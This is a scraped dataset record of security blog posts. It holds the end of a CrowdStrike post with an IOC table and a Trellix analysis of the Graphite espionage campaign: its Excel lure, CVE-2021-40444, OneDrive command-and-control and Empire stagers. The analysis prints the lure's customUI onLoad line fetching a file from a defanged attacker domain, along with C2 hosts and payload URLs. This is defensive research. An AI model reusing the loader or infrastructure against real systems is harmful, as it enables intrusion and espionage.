                "Credential Access",
                "T1539: Steal Web Session Cookie",
                "Lateral Movement",
                "Initial Access, Persistence",
                "T1078.004: Valid Accounts: Cloud Accounts",
                "Persistence",
                "Defense Evasion",
                "Discovery",
                "T1087.002: Account Discovery: Domain Account",
                "T1482: Domain Trust Discovery",
                "Defense Evasion / Lateral Movement",
                "Collection",
                "T1213.",
                ": Data from Information Repositories:Â",
                "Persistence",
                "Persistence",
                "T1078.004: Valid Accounts: Cloud Accounts",
                "Discovery",
                "T1057: Process Discovery",
                "Reconnaissance",
                "Indicators of Compromise (IOCs)",
                "Indicator",
                "Details",
                "http://satkas.waw[.]pl/rainloop/forecast",
                "TrailBlazer C2",
                "1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105",
                "TrailBlazer SHA256",
                "vm-srv-1.gel.ulaval.ca",
                "GoldMax C2",
                "2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac",
                "GoldMax SHA256",
                "156.96.46.116",
                "TA Infrastructure",
                "188.34.185.85",
                "TA Infrastructure",
                "212.103.61.74",
                "TA Infrastructure",
                "192.154.224.126",
                "TA Infrastructure",
                "23.29.115.180",
                "TA Infrastructure",
                "104.237.218.74",
                "TA Infrastructure",
                "23.82.128.144",
                "TA Infrastructure",
                "Additional Resources",
                "Tweet",
                "Share",
                "Related Content",
                "MPLog […]",
                "Categories",
                "Connect with Us",
                "SUBSCRIBE",
                "Sign Up",
                "See CrowdStrike Falcon in Action",
                "See Demo",
                "X",
                "Copyright Â© 2022 CrowdStrike",
                "Privacy",
                "Request Info",
                "Blog",
                "Contact Us",
                "1.888.512.8906",
                "English"
            ],
            "wordsNum": 287,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-25",
            "from_website": "Trellix",
            "title": "Prime Minister’s Office Compromised: Details of Recent Espionage Campaign",
            "from_url": "https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html",
            "content": [
                "Prime Minister’s Office Compromised:  Details of Recent Espionage Campaign",
                "Endpoint Security Cloud Security Collaboration Data and Users Applications Security Infrastructure Security",
                "A living security platform with a pulse that is always learning and always adapting.",
                "Learn how an XDR ecosystem that’s always adapting can energize your enterprise.",
                "Endpoint Security   Cloud Security   Collaboration   Data and Users   Applications Security   Infrastructure Security",
                "Download the Magic Quadrant report, which evaluates the 19 vendors based on ability to execute and completeness of vision.",
                "Gartner® Report: Market Guide for XDR",
                "As per Gartner, \"XDR is an emerging technology that can offer improved threat prevention, detection and response.\"",
                "Multi-stage cyberespionage campaign targeting high-ranking government officials overseeing national security policy and defense industry.",
                "Our new company’s first threat report features research on Log4j, prevalent ransomware, APT tools, ATR malware data, targeted clients, customer sectors, and MITRE ATT&CK techniques.",
                "News   Stories   Resources",
                "McAfee Enterprise and FireEye emerge as Trellix",
                "Two trusted leaders in cybersecurity have come together to create a resilient digital world.",
                "Trellix CEO, Bryan Palma, explains the critical need for security that’s always learning.",
                "The latest cybersecurity trends, best practices,",
                "Select Country Country* Afghanistan Aland Islands Albania Algeria American Samoa Andorra Angola Anguilla Antarctica Antigua and Barbuda Argentina Armenia Aruba Australia Austria Azerbaijan Bahamas Bahrain Bangladesh Barbados Belarus Belgium Belize Benin Bermuda Bhutan Bolivia Bonaire, Sint Eustatius and Saba Bosnia and Herzegovina Botswana Bouvet Island Brazil British Indian Ocean Territory Brunei Darussalam Bulgaria Burkina Faso Burundi Cabo Verde Cambodia Cameroon Canada Cayman Islands Central African Republic Chad Chile China Christmas Island Cocos (Keeling) Islands Colombia Comoros Congo Cook Islands Costa Rica Côte d'Ivoire Croatia Curaçao Cyprus Czechia Denmark Djibouti Dominica Dominican Republic Ecuador Egypt El Salvador Equatorial Guinea Eritrea Estonia Eswatini (previously Swaziland) Ethiopia Falkland Islands Faroe Islands Fiji Finland France French Guiana French Polynesia French Southern Territories Gabon Gambia Georgia Germany Ghana Gibraltar Greece Greenland Grenada Guadeloupe Guam Guatemala Guernsey Guinea Guinea-Bissau Guyana Haiti Heard Island and McDonald Islands Holy See (previously Vatican City State) Honduras Hong Kong Hungary Iceland India Indonesia Iraq Ireland Isle of Man Israel Italy Jamaica 日本 Jersey Jordan Kazakhstan Kenya Kiribati Korea, Republic of Kosovo Kuwait Kyrgyzstan Laos Latvia Lebanon Lesotho Liberia Libya Liechtenstein Lithuania Luxembourg Macao Macedonia, Republic of Madagascar Malawi Malaysia Maldives Mali Malta Marshall Islands Martinique Mauritania Mauritius Mayotte Mexico Micronesia, Federated States of Moldova Monaco Mongolia Montenegro Montserrat Morocco Mozambique Myanmar Namibia Nauru Nepal Netherlands Netherlands Antilles New Caledonia New Zealand Nicaragua Niger Nigeria Niue Norfolk Island Northern Mariana Islands Norway Oman Pakistan Palau Palestine, State of Panama Papua New Guinea Paraguay Peru Philippines Pitcairn Poland Portugal Puerto Rico Qatar Réunion Romania Russian Federation Rwanda Saint Barthélemy Saint Helena, Ascension and Tristan da Cunha Saint Kitts and Nevis Saint Lucia Saint Martin (French part) Saint Pierre and Miquelon Saint Vincent and the Grenadines Samoa (formerly Western Samoa) San Marino Sao Tome and Principe Saudi Arabia Senegal Serbia Seychelles Sierra Leone Singapore Sint Maarten (Dutch part) Slovakia Slovenia Solomon Islands Somalia South Africa South Georgia and the South Sandwich Islands South Sudan Spain Sri Lanka Suriname Svalbard and Jan Mayen Sweden Switzerland Taiwan Tajikistan Tanzania Thailand Timor-Leste Togo Tokelau Tonga Trinidad and Tobago Tunisia Turkey Turkmenistan Turks and Caicos Islands Tuvalu USA Uganda Ukraine United Arab Emirates United Kingdom United States Minor Outlying Islands Uruguay Uzbekistan Vanuatu Venezuela Viet Nam Virgin Islands, British Virgin Islands, U.S. Wallis and Futuna Western Sahara Yemen Zambia Zimbabwe Country",
                "The latest threat alerts and information.",
                "News, promos, and events for you.",
                "Please enter a valid email address.",
                "Holy See (previously Vatican City State)",
                "Saint Helena, Ascension and Tristan da Cunha",
                "South Georgia and the South Sandwich Islands",
                "Please select your country of residence.",
                "The latest threat alerts and information.",
                "News, promos, and events for you.",
                "Prime Minister’s Office Compromised:  Details of Recent Espionage Campaign",
                "By Marc Elias · January 25, 2022",
                "A special thanks to Christiaan Beek, Alexandre Mundo, Leandro Velasco and Max Kersten for malware analysis and support during this investigation.",
                "Our Advanced Threat Research Team have identified a multi-stage espionage campaign targeting high-ranking government officials overseeing national security policy and individuals in the defense industry in Western Asia.",
                "As we detail the technical components of this attack, we can confirm that we have undertaken pre-release disclosure to the victims and provided all necessary content required to remove all known attack components from their environments.",
                "The infection chain starts with the execution of an Excel downloader, most likely sent to the victim via email, which exploits an MSHTML remote code execution vulnerability (CVE-2021-40444) to execute a malicious executable in memory.",
                "The attack uses a follow-up piece of malware called Graphite because it uses Microsoft’s Graph API to leverage OneDrive as a command and control server—a technique our team has not seen before.",
                "Furthermore, the attack was split into multiple stages to stay as hidden as possible.",
                "Command and control functions used an Empire server that was prepared in July 2021, and the actual campaign was active from October to November 2021.",
                "The below blog will explain the inner workings, victimology, infrastructure and timeline of the attack and, of course, reveal the IOCs and MITRE ATT&CK techniques.",
                "A number of the attack indicators and apparent geopolitical objectives resemble those associated with the previously uncovered threat actor APT28.",
                "While we don’t believe in attributing any campaign solely based on such evidence, we have a moderate level of confidence that our assumption is accurate.",
                "That said, we are supremely confident that we are dealing with a very skilled actor based on how infrastructure, malware coding and operation were setup.",
                "Trellix customers are protected by the different McAfee Enterprise and FireEye products that were provided with these indicators.",
                "This section provides an analysis of the overall process of the attack, beginning with the execution of an Excel file containing an exploit for the MSHTML remote code execution vulnerability (CVE-2021-40444) vulnerability.",
                "This is used to execute a malicious DLL file acting as a downloader for the third stage malware we called Graphite.",
                "Graphite is a newly discovered malware sample based on a OneDrive Empire Stager which leverages OneDrive accounts as a command and control server via the Microsoft Graph API.",
                "The last phases of this multi-stage attack, which we believe is associated with an APT operation, includes the execution of different Empire stagers to finally download an Empire agent on victims’ computers and engage the command and control server to remotely control the systems.",
                "The following diagram shows the overall process of this attack.",
                "As suggested, the first stage of the attack likely uses a spear phishing email to lure victims into opening an Excel file, which goes by the name “parliament_rew.xlsx”.",
                "Below you can see the identifying information for this file:",
                "Excel Microsoft Office Open XML Format document",
                "Decoy text observed in the Excel file",
                "In analyzing this file’s structure, we observed that it includes a folder named “customUI” that contains a file named “customUI.xml”.",
                "Opening this file with a text editor, we observed that the malicious document uses the “CustomUI.OnLoad” property of the OpenXML format to load an external file from a remote server:",
                "This technique allows the attackers to bypass some antivirus scanning engines and office analysis tools, decreasing the chances of the documents being detected.",
                "The downloaded file is again an Excel spreadsheet, but this time it is saved using the old Microsoft Office Excel 97-2003 Binary File Format (.xls).",
                "Below you can see the identifying information of the file:",
                "Microsoft Office Excel 97-2003 Binary File Format",
                "Analyzing the metadata objects, we can identify that the creator was using the codepage 1252 used in Western European countries and the file was created on October 5th, 2021.",
                "Later, we analyzed the OLE objects in the document and discovered a Linked Object OLEStream Structure which contains a link to the exploit of the CVE-2021-40444 vulnerability hosted in the attackers’ server.",
                "This allows the document to automatically download the HTML file and subsequently call the Internet Explorer engine to interpret it, triggering the execution of the exploit.",
                "In this blog post we won’t examine the internals of the CVE-2021-40444 vulnerability as it has already been publicly explained and discussed.",
                "Instead, we will continue the analysis on the second stage DLL contained in the CAB file of the exploit.",
                "The second stage is a DLL executable named fontsubc.dll which was extracted from the CAB file used in the exploit mentioned before.",
                "You can see the identifying information of the file below:",
                "PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit",
                "This file exports a function called “CPlApplet” that Windows recognizes as a control panel application.",
                "Primarily, this acts a downloader for the next stage malware which is located at hxxps://wordkeyvpload[.]net/keys/update[.]dat using COM Objects and the API “URLOpenBlockingStreamW”.",
                "After downloading the file, the malware will decrypt it with an embedded RSA Public Key and check its integrity calculating a SHA-256 of the decrypted payload.",
                "Lastly, the malware will allocate virtual memory, copy the payload to it and execute it.",
                "Before executing the downloaded payload, the malware will compare the first four bytes with the magic value DE 47 AC 45 in hexadecimal; if they are different, it won’t execute the payload.",
                "The third stage is a DLL executable, never written to disk, named dfsvc.dll that we were able to extract from the memory of the previous stage.",
                "Below you can see the identifying information of the file:",
                "PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit",
                "We named this malware Graphite due to the use of the Microsoft Graph API to use OneDrive as command and control.",
                "It is very likely that the developers of Graphite used the Empire OneDrive Stager as a reference due to the similarities of the functionality and the file structure used in the OneDrive account of the actors.",
                "Graphite starts by creating a mutex with the hardcoded name “250gHJAWUI289382s3h3Uasuh289di” to avoid double executions, decrypt the strings and resolve dynamically the APIs it will use later.",
                "Moreover, it will calculate a bot identifier to identify the infected computer which is a CRC32 checksum of the value stored in the registry key “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Cryptography\\MachineGuid”.",
                "Next, the malware will create a thread to monitor the execution of tasks and upload its results to the OneDrive account.",
                "Result files will be uploaded to the “update” folder of the attackers’ OneDrive account.",
                "After that, the malware will enter into an infinite loop where every 20 minutes it will obtain a new OAuth2 token to use with the Microsoft Graph API requests and determine if there are new tasks to execute in the “check” folder of the attackers’ OneDrive account.",
                "Once it obtained a valid OAuth2 token, reconnaissance data is gathered containing the following information from the victims’ systems:",
                "The data is compressed using the LZNT1 algorithm and encrypted with a hardcoded AES-256-CBC key with a random IV.",
                "The operator tasks are encoded in the same way.",
                "Finally, the file containing the system information is uploaded to the folder “{BOT_ID}/update” in OneDrive with a random name.",
                "Graphite will also query for new commands by enumerating the child files in the \"check\" subdirectory.",
                "If a new file is found, it will use the Graph API to download the content of the file and decrypt it.",
                "The decrypted tasks have two fields; the first one is a unique identifier of the task and the second one specifies the command to execute.",
                "The command value “1” will instruct the malware to send the system information to the command and control again, which is the attackers’ OneDrive.",
                "The command value “2” indicates that the decrypted task is a shellcode, and the malware will create a thread to execute it.",
                "If the received task is a shellcode, it will check the third field with the magic value DE 47 AC 45 in hexadecimal and, if they are different, it won’t execute the payload.",
                "The rest of the bytes of the task is the shellcode that will be executed.",
                "Lastly, the task files are deleted from the OneDrive after being processed.",
                "The diagram below summarizes the flow of the Graphite malware.",
                "Fourth Stage",
                "Empire DLL Launcher Stager",
                "The fourth stage is a dynamic library file named csiresources.dll that we were able to extract from a task from the previous stage.",
                "The file was embedded into a Graphite shellcode task used to reflectively load the executable into the memory of the process and execute it.",
                "Below you can see the identifying information of the file:",
                "PE32 executable for MS Windows (DLL) (console) Intel 80386 32-bit",
                "The sample is a generated Empire DLL Launcher stager that will initialize and start the .NET CLR Runtime into an unmanaged process to execute a download-cradle to stage an Empire agent.",
                "With that, it is possible to run the Empire agent in a process that’s not PowerShell.exe.",
                "First, the malware will check if the malware is executing from the explorer.exe process.",
                "If it is not, the malware will exit.",
                "Next, the malware will try to find the file “EhStorShell.dll” in the System32 folder and load it.",
                "With this, the malware makes sure that the original “EhStorShell.dll” file is loaded into the explorer.exe context.",
                "The previous operation is important because the follow-up malware will override the CLSID “{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}” to gain persistence in the victims’ system, performing a COM Hijacking technique.",
                "The aforementioned CLSID corresponds to the “Enhanced Storage Shell Extension DLL” and is handled by the file “EhStorShell.dll”.",
                "Coming up next, the malware will load, initialize and start the .NET CLR Runtime, XOR decrypt the .NET next stage payload and load it into memory.",
                "Lastly, it will execute the file using the .NET Runtime.",
                "Fifth Stage",
                "Empire PowerShell C# Stager",
                "The fifth stage is a .NET executable named Service.exe which was embedded and encrypted in the previous stage.",
                "Below you can see the identifying information of the file:",
                "PE32 executable for MS Windows (console) Intel 80386 32-bit",
                "This sample is an Empire PowerShell C# Stager whose main goal is to create an instance of a PowerShell object, decrypt the embedded PowerShell script using XOR operations and decode it with Base64 before finally executing the payload with the Invoke function.",
                "The reason behind using a .NET executable to load and execute PowerShell code is to bypass security measures like AMSI, allowing execution from a process that shouldn’t allow it.",
                "Sixth Stage",
                "Empire HTTP PowerShell Stager",
                "The last stage is a PowerShell script, specifically an Empire HTTP Stager, which was embedded and encrypted in the previous stage.",
                "Below you can see the identifying information of the file:",
                "As we mentioned earlier, this is the last stage of the multi-stage attack and is an HTTP stager highly obfuscated using the Invoke-Obfuscation script from Empire to make analysis difficult.",
                "]jsp to send the initial information about the system and connect to the URL hxxp://wordkeyvpload[.]org/index[.]php to download the encrypted Empire agent, decrypt it with AES-256 and execute it.",
                "Based on all the activities monitored and analyzed, we provide the following timeline of events:",
                "One of the lure documents we mentioned before (named “parliament_rew.xlsx”) might have been aimed for targeting government employees.",
                "Besides targeting government entities, it appears this adversary also has its sights on the defense industry.",
                "Another document with the name “Missions Budget.xlsx” contained the text “Military and civilian missions and operations” and the budgets in dollars for the military operations in some countries for the years 2022 and 2023.",
                "Lure document targeting the defense sector",
                "Moreover, from our telemetry we also have observed that Poland and other Eastern European countries were of interest to the actors behind this campaign.",
                "The complete victimology of the actors is unknown, but the lure documents we have seen show its activities are centered in specific regions and industries.",
                "Based on the names, the content of the malicious Excel files and our telemetry, it seems the actors are targeting countries in Eastern Europe and the most prevalent industries are Defense and Government.",
                "Thanks to the analysis of the full attack chain, two hosts related to the attack were identified.",
                "The first domain is wordkeyvpload.net which resolves to the IP 131.153.96.114, located in Serbia and registered on the 7th of July 2021 with OwnRegistrar Inc.",
                "Querying the IP with a reverse DNS lookup tool, a PTR record was obtained resolving to the domain “bwh7196.bitcoinwebhosting.net” which could be an indication that the server was bought from the Bitcoin Web Hosting VPS reseller company.",
                "The main functionality of this command-and-control server is to host the HTML exploit for CVE-2021-40444 and the CAB file containing the second stage DLL.",
                "The second domain identified is wordkeyvpload.org which resolves to the IP 185.117.88.19, located in Sweden, and registered on the 18th of June 2021 with Namecheap Inc. Based on the operating system (Microsoft Windows Server 2008 R2), the HTTP server (Microsoft-IIS/7.5) and the open ports (1337 and 5000) it is very likely the host is running the latest version of the Empire post-exploitation framework.",
                "The reason behind that hypothesis is that the default configuration of Empire servers uses port 1337 to host a RESTful API and port 5000 hosts a SocketIO interface to interact remotely with the server.",
                "Also, when deploying a HTTP Listener, the default value for the HTTP Server field is hardcoded to “Microsoft-IIS/7.5”.",
                "Local Empire server execution with default configuration",
                "With the aforementioned information, as well as the extraction of the command and control from the last stage of the malware, we can confirm that this host acts as an Empire server used to remotely control the agents installed in victims’ machines and send commands to execute them.",
                "During the timeline of this operation there have been some political tensions around the Armenian and Azerbaijani border.",
                "Therefore, from a classic intelligence operation point of view, it would make complete sense to infiltrate and gather information to assess the risk and movements of the different parties involved.",
                "Throughout our research into the Graphite campaign, we extracted all timestamps of activity from the attackers from our telemetry and found two consistent trends.",
                "First, the activity days of the adversary are from Monday to Friday, as depicted in the image below:",
                "Second, the activity timestamps correspond to normal business hours (from 08h to 18h) in the GMT+3 time zone, which includes Moscow Time, Turkey Time, Arabia Standard Time and East Africa Time.",
                "Another interesting discovery during the investigation was that the attackers were using the CLSID (D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D) for persistence, which matched with an ESET report in which researchers mentioned a Russian Operation targeting Eastern European countries.",
                "Analyzing and comparing code-blocks and sequences from the graphite malware with our database of samples, we discovered overlap with samples in 2018 being attributed to APT28.",
                "We compared for example our samples towards this one: 5bb9f53636efafdd30023d44be1be55bf7c7b7d5 (sha1):",
                "Figure 27 Code comparison of samples",
                "When we zoom in on some of the functions, we observe on the left side of the below picture the graphite sample and on the right the forementioned 2018 sample.",
                "With almost three years in time difference, it makes sense that code is changed, but still it looks like the programmer was happy with some of the previous functions:",
                "Although we mentioned some tactics, techniques and procedures (TTPs) of the actors behind this campaign, we simply do not have enough context, similarities or overlap to point us with low/moderate confidence towards APT28, let alone a nation-state sponsor.",
                "However, we believe we are dealing with a skilled actor based on how the infrastructure, malware coding and operation was setup.",
                "The analysis of the campaign described in this blog post allowed us to gather insights into a multi-staged attack performed in early October, leveraging the MSHTML remote code execution vulnerability (CVE-2021-40444) to target countries in Eastern Europe.",
                "As seen in the analysis of the Graphite malware, one quite innovative functionality is the use of the OneDrive service as a Command and Control through querying the Microsoft Graph API with a hardcoded token in the malware.",
                "This type of communication allows the malware to go unnoticed in the victims’ systems since it will only connect to legitimate Microsoft domains and won’t show any suspicious network traffic.",
                "Thanks to the analysis of the full attack process, we were able to identify new infrastructure acting as command and control from the actors and the final payload, which is an agent from the post-exploitation framework Empire.",
                "All the above allowed us to construct a timeline of the activity observed in the campaign.",
                "The actors behind the attack seem very advanced based on the targeting, the malware and the infrastructure used in the operation, so we presume that the main goal of this campaign is espionage.",
                "With a low and moderate confidence, we believe this operation was executed by APT28.",
                "To further investigate, we provided some tactics, techniques and procedures (TTPs), indicators on the infrastructure, targeting and capabilities to detect this campaign.",
                "Attackers purchased domains to be used as a command and control.",
                "Attackers built malicious components to conduct their attack.",
                "Attackers employed red teaming tools to conduct their attack.",
                "Adversaries sent spear phishing emails with a malicious attachment to gain access to victim systems.",
                "Adversaries exploited a vulnerability in Microsoft Office to execute code.",
                "Adversaries abused PowerShell for execution of the Empire stager.",
                "Event Triggered Execution: Component Object Model Hijacking",
                "Adversaries established persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.",
                "Adversaries created a local account to maintain access to victim systems.",
                "Adversaries reflectively loaded code into a process to conceal the execution of malicious payloads.",
                "Adversaries created multiple stages to obfuscate the command-and-control channel and to make detection more difficult.",
                "Adversaries used an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel.",
                "Adversaries employed a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
                "Adversaries employed a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
                "Fourth stage",
                "DLL Launcher Stager",
                "Fifth stage",
                "PowerShell C# Stager",
                "Sixth stage",
                "Empire HTTP Powershell Stager",
                "Trellix Sees Advanced Persistent Threat Actors and Ransomware Groups Focus on Financial Services in Third Quarter of 2021",
                "Symphony Technology Group Announces the Launch of Extended Detection and Response Provider, Trellix",
                "FireEye Endpoint Security Takes Home SE Labs’ 2021 “Best Product Development” Award",
                "A Look Ahead to 2022: McAfee Enterprise & FireEye Predict Top Cyber Threats",
                "By Bryan Palma · January 19, 2022",
                "Trellix CEO, Bryan Palma, explains the critical need for security that’s always learning.",
                "Time to Drive Change by Challenging the Challengers",
                "By Michelle Salvado · January 19, 2022",
                "Dynamic threats call for dynamic security",
                "the path to resiliency lies in XDR.",
                "By Trellix · January 19, 2022",
                "What cyber security threats should enterprises look out for in 2022?",
                "But we are a new company.Stay up to date as we evolve.",
                "Please enter a valid email address.",
                "Copyright ©️ 2022 Musarubra US LLC",
                "Please pardon our appearance as we transition from McAfee Enterprise to Trellix.",
                "Exciting changes are in the works.",
                "We look forward to discussing your enterprise security needs.",
                "You will be redirected in 0 seconds.",
                "If not, please click here to continue",
                "Please pardon our appearance as we transition from FireEye to Trellix.",
                "Exciting changes are in the works.",
                "We look forward to discussing your enterprise security needs.",
                "You will be redirected in 0 seconds.",
                "If not, please click here to continue"
            ],
            "sentencesNum": 202,
            "words": [
                "Contact",
                "Search",
                "Menu",
                "Why Trellix?",
                "Products",
                "Threat Center",
                "Newsroom",
                "Support",
                "Partners",
                "Cancel",
                "Why Trellix?",
                "Products",
                "Threat Center",
                "Newsroom",
                "Support Partners Contact",
                "Main menu",
                "Why Trellix?",
                "Leadership Careers",
                "Main menu",
                "Trellix Platform",
                "Main menu",
                "Threat Center",
                "Threat Reports",
                "Main menu",
                "Newsroom",
                "News Stories Resources",
                "Why Trellix?",
                "Leadership   Careers",
                "Trellix Introduction",
                "XDR Solution Brief",
                "Trellix Platform",
                "Gartner MQ (Endpoint)",
                "Threat Center",
                "Threat Reports",
                "Prime Minister’s Office Compromised",
                "Trellix Threat Report: January 2022",
                "Newsroom",
                "Our CEO on living security",
                "Stories",
                "security vulnerabilities, and more",
                "Subscribe",
                "Stay updated",
                "Email address",
                "Subscription Topics",
                "Subscribe",
                "Stay updated",
                "Email address",
                "Select Country",
                "Afghanistan",
                "Aland Islands",
                "Albania",
                "Algeria",
                "American Samoa",
                "Andorra",
                "Angola",
                "Anguilla",
                "Antarctica",
                "Antigua and Barbuda",
                "Argentina",
                "Armenia",
                "Aruba",
                "Australia",
                "Austria",
                "Azerbaijan",
                "Bahamas",
                "Bahrain",
                "Bangladesh",
                "Barbados",
                "Belarus",
                "Belgium",
                "Belize",
                "Benin",
                "Bermuda",
                "Bhutan",
                "Bolivia",
                "Bonaire, Sint Eustatius and Saba",
                "Bosnia and Herzegovina",
                "Botswana",
                "Bouvet Island",
                "Brazil",
                "British Indian Ocean Territory",
                "Brunei Darussalam",
                "Bulgaria",
                "Burkina Faso",
                "Burundi",
                "Cabo Verde",
                "Cambodia",
                "Cameroon",
                "Canada",
                "Cayman Islands",
                "Central African Republic",
                "Chad",
                "Chile",
                "China",
                "Christmas Island",
                "Cocos (Keeling) Islands",
                "Colombia",
                "Comoros",
                "Congo",
                "Cook Islands",
                "Costa Rica",
                "Côte d'Ivoire",
                "Croatia",
                "Curaçao",
                "Cyprus",
                "Czechia",
                "Denmark",
                "Djibouti",
                "Dominica",
                "Dominican Republic",
                "Ecuador",
                "Egypt",
                "El Salvador",
                "Equatorial Guinea",
                "Eritrea",
                "Estonia",
                "Eswatini (previously Swaziland)",
                "Ethiopia",
                "Falkland Islands",
                "Faroe Islands",
                "Fiji",
                "Finland",
                "France",
                "French Guiana",
                "French Polynesia",
                "French Southern Territories",
                "Gabon",
                "Gambia",
                "Georgia",
                "Germany",
                "Ghana",
                "Gibraltar",
                "Greece",
                "Greenland",
                "Grenada",
                "Guadeloupe",
                "Guam",
                "Guatemala",
                "Guernsey",
                "Guinea",
                "Guinea-Bissau",
                "Guyana",
                "Haiti",
                "Heard Island and McDonald Islands",
                "Honduras",
                "Hong Kong",
                "Hungary",
                "Iceland",
                "India",
                "Indonesia",
                "Iraq",
                "Ireland",
                "Isle of Man",
                "Israel",
                "Italy",
                "Jamaica",
                "日本",
                "Jersey",
                "Jordan",
                "Kazakhstan",
                "Kenya",
                "Kiribati",
                "Korea, Republic of",
                "Kosovo",
                "Kuwait",
                "Kyrgyzstan",
                "Laos",
                "Latvia",
                "Lebanon",
                "Lesotho",
                "Liberia",
                "Libya",
                "Liechtenstein",
                "Lithuania",
                "Luxembourg",
                "Macao",
                "Macedonia, Republic of",
                "Madagascar",
                "Malawi",
                "Malaysia",
                "Maldives",
                "Mali",
                "Malta",
                "Marshall Islands",
                "Martinique",
                "Mauritania",
                "Mauritius",
                "Mayotte",
                "Mexico",
                "Micronesia, Federated States of",
                "Moldova",
                "Monaco",
                "Mongolia",
                "Montenegro",
                "Montserrat",
                "Morocco",
                "Mozambique",
                "Myanmar",
                "Namibia",
                "Nauru",
                "Nepal",
                "Netherlands",
                "Netherlands Antilles",
                "New Caledonia",
                "New Zealand",
                "Nicaragua",
                "Niger",
                "Nigeria",
                "Niue",
                "Norfolk Island",
                "Northern Mariana Islands",
                "Norway",
                "Oman",
                "Pakistan",
                "Palau",
                "Palestine, State of",
                "Panama",
                "Papua New Guinea",
                "Paraguay",
                "Peru",
                "Philippines",
                "Pitcairn",
                "Poland",
                "Portugal",
                "Puerto Rico",
                "Qatar",
                "Réunion",
                "Romania",
                "Russian Federation",
                "Rwanda",
                "Saint Barthélemy",
                "Saint Kitts and Nevis",
                "Saint Lucia",
                "Saint Martin (French part)",
                "Saint Pierre and Miquelon",
                "Saint Vincent and the Grenadines",
                "Samoa (formerly Western Samoa)",
                "San Marino",
                "Sao Tome and Principe",
                "Saudi Arabia",
                "Senegal",
                "Serbia",
                "Seychelles",
                "Sierra Leone",
                "Singapore",
                "Sint Maarten (Dutch part)",
                "Slovakia",
                "Slovenia",
                "Solomon Islands",
                "Somalia",
                "South Africa",
                "South Sudan",
                "Spain",
                "Sri Lanka",
                "Suriname",
                "Svalbard and Jan Mayen",
                "Sweden",
                "Switzerland",
                "Taiwan",
                "Tajikistan",
                "Tanzania",
                "Thailand",
                "Timor-Leste",
                "Togo",
                "Tokelau",
                "Tonga",
                "Trinidad and Tobago",
                "Tunisia",
                "Turkey",
                "Turkmenistan",
                "Turks and Caicos Islands",
                "Tuvalu",
                "USA",
                "Uganda",
                "Ukraine",
                "United Arab Emirates",
                "United Kingdom",
                "United States Minor Outlying Islands",
                "Uruguay",
                "Uzbekistan",
                "Vanuatu",
                "Venezuela",
                "Viet Nam",
                "Virgin Islands, British",
                "Virgin Islands, U.S.",
                "Wallis and Futuna",
                "Western Sahara",
                "Yemen",
                "Zambia",
                "Zimbabwe",
                "Country",
                "Subscription Topics",
                "Subscribe",
                "<<",
                "Stories:",
                "XDR",
                "Threat Labs",
                "Perspectives",
                "Executive Summary",
                "Analysis of the Attack Process",
                "Figure 1.",
                "Attack flow",
                "First Stage",
                "Excel Downloaders",
                "File type",
                "File name",
                "parliament_rew.xlsx",
                "File size",
                "19.26 KB",
                "Compilation time",
                "05/10/2021",
                "MD5",
                "8e2f8c95b1919651fcac7293cb704c1c",
                "SHA-256",
                "f007020c74daa0645b181b7b604181613b68d195bd585afd71c3cd5160fb8fc4",
                "Figure 2.",
                "<customUI xmlns=\"http://schemas.microsoft.com/office/2006/01/customui\" onLoad='https://wordkeyvpload[.]net/keys/parliament_rew.xls!123'> </customUI>",
                "File type",
                "File name",
                "parliament_rew.xls",
                "File size",
                "20.00 KB",
                "Compilation time",
                "05/10/2021",
                "MD5",
                "abd182f7f7b36e9a1ea9ac210d1899df",
                "SHA-256",
